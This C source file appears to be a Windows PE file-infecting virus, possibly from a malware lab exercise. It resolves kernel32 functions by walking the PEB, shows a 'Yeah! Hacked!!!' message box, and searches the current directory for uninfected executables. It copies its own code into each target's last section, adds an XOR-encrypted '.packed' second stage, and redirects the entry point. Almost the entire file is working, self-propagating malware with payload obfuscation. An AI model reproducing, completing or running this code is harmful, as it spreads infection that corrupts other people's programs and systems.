#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "libproc.h"

#ifdef DEBUG
void    list_dll()
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;

    LOG("Teb %p\n", pTeb);
    LOG("Peb %p\n", pPeb);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    LOG("LDR %p\n", pLdr);
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        LOG("node %p\n", pNode);
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pNode, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        LOG("entry %ls\n", pEntry->FullDllName.Buffer);
        LOG("base %p\n", pEntry->DllBase);
    }
}

void    list_func(PVOID dllBase)
{
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)dllBase + pDosHeader->e_lfanew);
    //LOG("NtHead %p\n", pNtHeader);
    PIMAGE_DATA_DIRECTORY pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //LOG("pDir %p\n", pDir);
    //LOG("pVirt %x\n", pDir->VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)dllBase + pDir->VirtualAddress);
    //LOG("pExp %p\n", pExp);
    PDWORD rvaNames = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfNames);
    PWORD aryOrds = (PWORD)((PUCHAR)dllBase + pExp->AddressOfNameOrdinals);
    PDWORD rvaFuncs = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfFunctions);
    for (int i = 0; i < pExp->NumberOfFunctions; i += 1)
    {
        //LOG("rvaName %d\n", rvaNames[i]);
        //LOG("Name %s\n", (PCHAR)((PCHAR)dllBase + rvaNames[i]));
        WORD ord = aryOrds[i];
        //LOG("ord %d\n", ord);
        PVOID pFunc = (PVOID)((PUCHAR)dllBase + rvaFuncs[ord]);
        //LOG("pFunc %p\n", pFunc);
    }
}

#endif

//__declspec(code_seg("injected"))
__declspec(code_seg("decrypt"))
int my_wstrcmp_d(PWSTR src1, PWSTR src2)
{
    for (int i = 0; src1[i]; i += 1)
        if (src1[i] != src2[i])
            return src1[i] - src2[i];
    return 0;
}

__declspec(code_seg("injected"))
int my_wstrcmp(PWSTR src1, PWSTR src2)
{
    for (int i = 0; src1[i]; i += 1)
        if (src1[i] != src2[i])
            return src1[i] - src2[i];
    return 0;
}

__declspec(code_seg("injected"))
void my_memcpy_i(PUCHAR dst, PUCHAR src, DWORD len)
{
    for (DWORD i = 0; i < len; i += 1)
        dst[i] = src[i];
}

//__declspec(code_seg("injected"))
__declspec(code_seg("decrypt"))
int my_strcmp_d(PCHAR src1, PCHAR src2)
{
    for (int i = 0; src1[i]; i += 1)
        if (src1[i] != src2[i])
            return src1[i] - src2[i];
    return 0;
}

__declspec(code_seg("injected"))
int my_strcmp(PCHAR src1, PCHAR src2)
{
    for (int i = 0; src1[i]; i += 1)
        if (src1[i] != src2[i])
            return src1[i] - src2[i];
    return 0;
}

//__declspec(code_seg("injected"))
__declspec(code_seg("decrypt"))
PVOID    get_dll_d(PWSTR name)
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;

    LOG("Teb %p\n", pTeb);
    LOG("Peb %p\n", pPeb);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    LOG("LDR %p\n", pLdr);
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        LOG("node %p\n", pNode);
        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY) (pNode - 1);
        LOG("entry %ls\n", pEntry->FullDllName.Buffer);
        LOG("base %p\n", pEntry->DllBase);
        if (!my_wstrcmp_d(name, pEntry->FullDllName.Buffer))
            return pEntry->DllBase;
    }
    return NULL;
}

__declspec(code_seg("injected"))
PVOID    get_dll(PWSTR name)
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;

    LOG("Teb %p\n", pTeb);
    LOG("Peb %p\n", pPeb);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    LOG("LDR %p\n", pLdr);
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        LOG("node %p\n", pNode);
        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY) (pNode - 1);
        LOG("entry %ls\n", pEntry->FullDllName.Buffer);
        LOG("base %p\n", pEntry->DllBase);
        if (!my_wstrcmp(name, pEntry->FullDllName.Buffer))
            return pEntry->DllBase;
    }
    return NULL;
}

//__declspec(code_seg("injected"))
__declspec(code_seg("decrypt"))
PVOID    get_func_d(PCHAR name, PVOID dllBase)
{
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)dllBase + pDosHeader->e_lfanew);
    //LOG("NtHead %p\n", pNtHeader);
    PIMAGE_DATA_DIRECTORY pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //LOG("pDir %p\n", pDir);
    //LOG("pVirt %x\n", pDir->VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)dllBase + pDir->VirtualAddress);
    //LOG("pExp %p\n", pExp);
    PDWORD rvaNames = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfNames);
    PWORD aryOrds = (PWORD)((PUCHAR)dllBase + pExp->AddressOfNameOrdinals);
    PDWORD rvaFuncs = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfFunctions);
    for (int i = 0; i < pExp->NumberOfFunctions; i += 1)
    {
        //LOG("rvaName %d\n", rvaNames[i]);
        PCHAR pName = (PCHAR)((PCHAR)dllBase + rvaNames[i]);
        //LOG("Name %s\n", pName);
        if (!my_strcmp_d(name, pName))
        {
            WORD ord = aryOrds[i];
            //LOG("ord %d\n", ord);
            PVOID pFunc = (PVOID)((PUCHAR)dllBase + rvaFuncs[ord]);
            //LOG("pFunc %p\n", pFunc);
            return pFunc;
        }
    }
    return NULL;
}

__declspec(code_seg("injected"))
PVOID    get_func(PCHAR name, PVOID dllBase)
{
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)dllBase + pDosHeader->e_lfanew);
    //LOG("NtHead %p\n", pNtHeader);
    PIMAGE_DATA_DIRECTORY pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //LOG("pDir %p\n", pDir);
    //LOG("pVirt %x\n", pDir->VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)dllBase + pDir->VirtualAddress);
    //LOG("pExp %p\n", pExp);
    PDWORD rvaNames = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfNames);
    PWORD aryOrds = (PWORD)((PUCHAR)dllBase + pExp->AddressOfNameOrdinals);
    PDWORD rvaFuncs = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfFunctions);
    for (int i = 0; i < pExp->NumberOfFunctions; i += 1)
    {
        //LOG("rvaName %d\n", rvaNames[i]);
        PCHAR pName = (PCHAR)((PCHAR)dllBase + rvaNames[i]);
        //LOG("Name %s\n", pName);
        if (!my_strcmp(name, pName))
        {
            WORD ord = aryOrds[i];
            //LOG("ord %d\n", ord);
            PVOID pFunc = (PVOID)((PUCHAR)dllBase + rvaFuncs[ord]);
            //LOG("pFunc %p\n", pFunc);
            return pFunc;
        }
    }
    return NULL;
}

typedef HMODULE (*loadlib_call)(LPCSTR);

typedef int (*msgbox_call)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

typedef HANDLE (*create_file_a_def)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef HANDLE (*create_file_mapping_def)(
    HANDLE                hFile,
    LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
    DWORD                 flProtect,
    DWORD                 dwMaximumSizeHigh,
    DWORD                 dwMaximumSizeLow,
    LPCSTR                lpName
);

typedef LPVOID (*map_view_of_file_def)(
    HANDLE hFileMappingObject,
    DWORD  dwDesiredAccess,
    DWORD  dwFileOffsetHigh,
    DWORD  dwFileOffsetLow,
    SIZE_T dwNumberOfBytesToMap
);

typedef BOOL (*close_handle_def)(
    HANDLE hObject
);

typedef BOOL (*unmap_view_of_file_def)(
    LPCVOID lpBaseAddress
);

typedef HANDLE (*find_first_file_def)(
    LPCSTR             lpFileName,
    LPWIN32_FIND_DATAA lpFindFileData
);

typedef BOOL (*find_next_file_def)(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAA lpFindFileData
);

typedef BOOL (*find_close_def)(
    HANDLE hFindFile
);

typedef BOOL (*virtual_protect_def)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

typedef DWORD (*get_file_size_def)(
    HANDLE  hFile,
    LPDWORD lpFileSizeHigh
);

typedef HMODULE (*get_module_handle_def)(
    LPCSTR lpModuleName
);

//__declspec(allocate("injected"))
__declspec(allocate("decrypt"))
short kernel32_str_d[] = L"C:\\Windows\\System32\\KERNEL32.DLL";

__declspec(allocate("injected"))
short kernel32_str[] = L"C:\\Windows\\System32\\KERNEL32.DLL";

//__declspec(allocate("injected"))
__declspec(allocate("decrypt"))
char get_module_handle_str_d[] = "GetModuleHandle";

__declspec(allocate("injected"))
char get_module_handle_str[] = "GetModuleHandle";

__declspec(allocate("injected"))
char loadlibrary_str[] = "LoadLibraryA";

__declspec(allocate("injected"))
char user32_str[] = "user32.dll";

__declspec(allocate("injected"))
char msgbox_str[] = "MessageBoxA";

__declspec(allocate("injected"))
char msgbox_body_str[] = "Yeah! Hacked!!!";

__declspec(allocate("injected"))
char msgbox_caption_str[] = "HackBox";

__declspec(allocate("injected"))
char find_first_file_str[] = "FindFirstFile";

__declspec(allocate("injected"))
char create_file_a_str[] = "CreateFileA";

__declspec(allocate("injected"))
char create_file_mapping_str[] = "CreateFileMapping";

__declspec(allocate("injected"))
char close_handle_str[] = "CloseHandle";

__declspec(allocate("injected"))
char map_view_of_file_str[] = "MapViewOfFile";

__declspec(allocate("injected"))
char unmap_view_of_file_str[] = "UnmapViewOfFile";

__declspec(allocate("injected"))
char find_close_str[] = "FindClose";

__declspec(allocate("injected"))
char find_next_file_str[] = "FindNextFile";

__declspec(allocate("injected"))
char wildcard_str[] = "*";

//__declspec(allocate("injected"))
__declspec(allocate("decrypt"))
char virtual_protect_str_d[] = "VirtualProtect";

__declspec(allocate("injected"))
char virtual_protect_str[] = "VirtualProtect";

__declspec(allocate("injected"))
char get_file_size_str[] = "GetFileSize";

__declspec(allocate("injected"))
char new_section_name[] = ".packed";

__declspec(allocate("injected"))
int new_section_size = 0x1000;

__declspec(code_seg("injected"))
int add_section_i(BYTE *fileData, char *data, DWORD size) {

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileData + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    WORD numberOfSections = ntHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER newSectionHeader = &sectionHeader[numberOfSections];

    // Set new section name
    //strncpy((char*)newSectionHeader->Name, new_section_name, IMAGE_SIZEOF_SHORT_NAME);
    my_memcpy_i((char*)newSectionHeader->Name, new_section_name, sizeof(new_section_name) + 1);

    // Calculate new section attributes
    DWORD newSectionVirtualAddress = sectionHeader[numberOfSections - 1].VirtualAddress + sectionHeader[numberOfSections - 1].Misc.VirtualSize;
    newSectionVirtualAddress = (newSectionVirtualAddress + 0xFFF) & ~0xFFF;  // Align to 4KB
    DWORD newSectionPointerToRawData = ((sectionHeader[numberOfSections - 1].PointerToRawData + sectionHeader[numberOfSections - 1].SizeOfRawData) + 0xFFF) & ~0xFFF;

    // Fill new section header
    newSectionHeader->Misc.VirtualSize = new_section_size;
    newSectionHeader->VirtualAddress = newSectionVirtualAddress;
    newSectionHeader->SizeOfRawData = new_section_size;
    newSectionHeader->PointerToRawData = newSectionPointerToRawData;
    newSectionHeader->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

    //pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;*/

    // Update NT headers
    ntHeaders->FileHeader.NumberOfSections += 1;
    ntHeaders->OptionalHeader.SizeOfImage = newSectionVirtualAddress + new_section_size;

    
    my_memcpy_i(fileData + newSectionPointerToRawData, data, size);
    /*printf("DUMP DATATATATAT::: %d\n", size);
    for (int i=0; i<size; i++)
        printf("%X ", ((PUCHAR)data)[i]);
    printf("\n");*/

    newSectionHeader->Misc.VirtualSize = size;
    newSectionHeader->SizeOfRawData = size;
    newSectionHeader->PointerToRawData = newSectionPointerToRawData;

    return 0;
}


__declspec(code_seg("injected"))
int is_pe_file(LPCTSTR filename, PVOID dll) {
    PVOID create_file_a = get_func(create_file_a_str, dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PVOID create_file_mapping = get_func(create_file_mapping_str, dll);
    PVOID close_handle = get_func(close_handle_str, dll);
    HANDLE hMapping = ((create_file_mapping_def)create_file_mapping)(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func(map_view_of_file_str, dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;

    // Check if the file has the 'MZ' magic number
    PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);
    if (pDosHeader->e_magic != 0x5A4D || (pDosHeader->e_magic == 0x5A4D && *(DWORD*)(&pDosHeader->e_res2[8]) == 0x4A4E49)) {
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Check if it has a valid PE signature
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpMapAdr + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != 0x00004550) { // 'PE\0\0'
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapping);
    ((close_handle_def)close_handle)(hFile);

    return 1;
}

__declspec(code_seg("injected"))
void list_pe_files_and_inject(PVOID dll) {
    
    PVOID find_first_file = get_func(find_first_file_str, dll);
    
    PVOID find_next_file = get_func(find_next_file_str, dll);
    PVOID find_close = get_func(find_close_str, dll);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = ((find_first_file_def)find_first_file)(wildcard_str, &findFileData);

    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (is_pe_file(findFileData.cFileName, dll)) {
                injector(dll, (char *)findFileData.cFileName);
                    return;
            }
        }
    } while (((find_next_file_def)find_next_file)(hFind, &findFileData) != 0);

    ((find_close_def)find_close)(hFind);
    return ;
}


__declspec(code_seg("injected"))
int injector(PVOID dll, char *thefile)
{
    PVOID get_module_handle = get_func(get_module_handle_str, dll);
    HMODULE hModule = ((get_module_handle_def)get_module_handle)(NULL);
    if (hModule == NULL) {
        return 1;
    }
    LPVOID lpBaseAddress = (LPVOID)hModule;
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;

    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpBaseAddress + pDosHeader->e_lfanew);
    DWORD ep = (DWORD) pNtHeader->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)hModule + ep);
    //PUCHAR aep = (PUCHAR) entry_point;
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
    // Reloc , avant derniere section
    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 2;

    //LPVOID relocSectionPtr = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);
    DWORD size = pSection[idxSection].SizeOfRawData - (pNtHeader->OptionalHeader.AddressOfEntryPoint - pSection[idxSection].VirtualAddress);
    DWORD first_stage_size = size;
    LPVOID srcPtr = entryPoint;

    idxSection = pNtHeader->FileHeader.NumberOfSections - 1;
    LPVOID srcPtr_second_stage = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);
    DWORD second_stage_size = pSection[idxSection].Misc.VirtualSize;

    //char *thefile = av[1];
    PVOID create_file_a = get_func(create_file_a_str, dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(
            thefile,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
            );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PVOID get_file_size = get_func(get_file_size_str, dll);
    DWORD dwFileSize = ((get_file_size_def)get_file_size)(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + new_section_size + second_stage_size;
    PVOID create_file_mapping = get_func(create_file_mapping_str, dll);
    PVOID close_handle = get_func(close_handle_str, dll);

    HANDLE hMapFile = ((create_file_mapping_def)create_file_mapping)(
                hFile,
                NULL,
                PAGE_READWRITE,
                0,
                dwNewFileSize,
                NULL
            );
    if (!hMapFile) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func(map_view_of_file_str, dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(
                hMapFile,
                FILE_MAP_ALL_ACCESS,
                0,
                0,
                0 // dwFileSize
            );

    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapFile);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    } 
    // LIST PE HEADER
    pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
    my_memcpy_i((void*)&pDosHeader->e_res2[8], "INJ\x00", 4);
    //*((&pDosHeader->e_res2[8]) - 0x2) = first_stage_size;
    pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
    pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
    idxSection = pNtHeader->FileHeader.NumberOfSections - 1;
    PUCHAR dstPtr = (PUCHAR)lpMapAdr + pSection[idxSection].PointerToRawData + pSection[idxSection].SizeOfRawData;
    
    DWORD old_EP =  pNtHeader->OptionalHeader.AddressOfEntryPoint;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = pSection[idxSection].VirtualAddress + pSection[idxSection].SizeOfRawData;
    

    my_memcpy_i(dstPtr, (PUCHAR)srcPtr, first_stage_size);

    pSection[idxSection].Misc.VirtualSize = first_stage_size;
    pSection[idxSection].SizeOfRawData = (first_stage_size + 0xFFF) & ~0xFFF;
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;  

    add_section_i((BYTE *)lpMapAdr, (PUCHAR)srcPtr_second_stage, second_stage_size);

    PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapFile);
    ((close_handle_def)close_handle)(hFile);

    return 1;
}

__declspec(code_seg("injected"))
void       inj_code_c() {
    
    PVOID dll = get_dll(kernel32_str);
    PVOID loadlib = get_func(loadlibrary_str, dll);
    HMODULE hM = ((loadlib_call)loadlib)(user32_str);
    PVOID msgbox = get_func(msgbox_str, hM);
    ((msgbox_call)msgbox)(NULL, msgbox_body_str, msgbox_caption_str, 0);
    list_pe_files_and_inject(dll);

    return;
}

__declspec(code_seg("decrypt"))
PVOID decryption(DWORD size_decrypt) {
    DWORD oldProtect;
    PVOID dll = get_dll_d(kernel32_str_d);

    PVOID get_module_handle = get_func_d(get_module_handle_str_d, dll);
    HMODULE hModule = ((get_module_handle_def)get_module_handle)(NULL);
    if (hModule == NULL) {
        //printf("Error getting module handle\n");
        return NULL;
    }
    LPVOID lpBaseAddress = (LPVOID)hModule;
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;

    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpBaseAddress + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 1;

    LPVOID packedSectionPtr = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);

    PVOID addr = (PVOID) ((PUCHAR)packedSectionPtr);

    PVOID virtual_protect = get_func_d(virtual_protect_str_d, dll);
    ((virtual_protect_def)virtual_protect)(addr, size_decrypt, PAGE_READWRITE, &oldProtect);
    UCHAR KEY = 0xAA;
    UCHAR new_key = 0;
    for(DWORD i=0; i<size_decrypt; ++i) {
        new_key = ((PUCHAR)addr)[i];
        ((PUCHAR)addr)[i] = ((PUCHAR)addr)[i] ^ KEY;
        KEY = new_key;
    }
    // Restore original protection
    ((virtual_protect_def)virtual_protect)(addr, size_decrypt, oldProtect, &oldProtect);
    /*void (*decrypted_func)();
    decrypted_func = (void (*)())addr;
    decrypted_func();*/
    return addr;
}

//__declspec(code_seg("decrypt"))
VOID encryption(PVOID addr, DWORD size) {
    DWORD oldProtect;
    VirtualProtect(addr, size, PAGE_READWRITE, &oldProtect);
    DWORD KEY = 0xAA;
    DWORD new_key = 0;
    for(DWORD i=0; i<size; ++i) {
        new_key = ((PUCHAR)addr)[i] ^ KEY;
        ((PUCHAR)addr)[i] = new_key;
        KEY = new_key;
    }

    // Restore original protection
    VirtualProtect(addr, size, oldProtect, &oldProtect);
    return;
}
